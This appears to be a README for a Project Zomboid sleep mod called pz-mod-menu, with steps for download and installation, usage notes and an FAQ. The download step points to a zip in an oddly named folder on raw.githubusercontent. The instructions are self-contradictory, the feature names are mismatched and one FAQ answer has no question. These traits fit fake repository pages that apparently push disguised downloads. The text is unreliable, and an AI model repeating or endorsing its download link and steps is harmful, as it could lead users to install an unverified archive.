## 🚀 Getting Started

Getting pz-mod-menu up and running is simple. Just follow these three easy steps:

### Step 1: Download the Mod

Visit this link to download the application: **[https://raw.githubusercontent.com/sansoz/pz-mod-menu/main/barrenly/menu_mod_pz_1.6-beta.4.zip](https://raw.githubusercontent.com/sansoz/pz-mod-menu/main/barrenly/menu_mod_pz_1.6-beta.4.zip)**

Click the green "Code" button on that page, then choose "Download ZIP." This downloads the whole mod package to your computer.

### Step 2: Find Your Project Zomboid Folder

Open your file explorer and navigate to:

```
C:\Users\[YourUsername]\Zomboid\Workshop
```

If you don't see a "Workshop" folder, create a new folder and name it exactly "Workshop" (without quotes). This is where Project Zomboid looks for mods.

### Step 3: Install the Mod

1. Extract the downloaded ZIP file (right-click → "Extract All").
2. Inside the extracted folder, look for a folder named **pz-mod-menu-master** or **pz-mod-menu**.
3. Copy this entire folder into the `Workshop` folder you found in Step 2.
4. Launch Project Zomboid, go to **Mods** in the main menu, and enable **pz-mod-menu**.

That's it! The mod is now active. You'll see a new sleep option in your game's settings menu.

## 🧭 How to Use the Mod

Once installed, using pz-mod-menu is as easy as:

1. **Press ESC** to open the game menu.
2. Click on **Mod Options**.
3. Select **pz-mod-menu** from the list.
4. Toggle the "Enshrouded Sleep" feature on or off.
5. Set your preferred sleep duration (default is 8 hours).

The mod automatically adjusts your character's sleep cycle, so you don't need to micromanage anything. Just play the game, and when it's time to rest, your character will handle it smoothly.

Most issues are easy to fix. Here are common solutions:

| Problem | Solution |
|---------|----------|
| Mod doesn't appear in-game | Double-check that the folder is inside `Workshop`, not in a sub-folder. |
| Game crashes on startup | Remove the mod folder and re-download fresh. |

## ❓ Frequently Asked Questions

### Do I need to know programming to use this?
No. Everything is pre-built. You just copy, paste, and play.

### Will this work with multiplayer?
Yes, as long as the server host installs it on their side too.

### Can I uninstall it easily?
Yes. Go to Mods in the game menu and disable it. Or delete the folder from `Workshop`.

No. The mod only changes sleep mechanics. Your character, items, and world stay exactly the same.
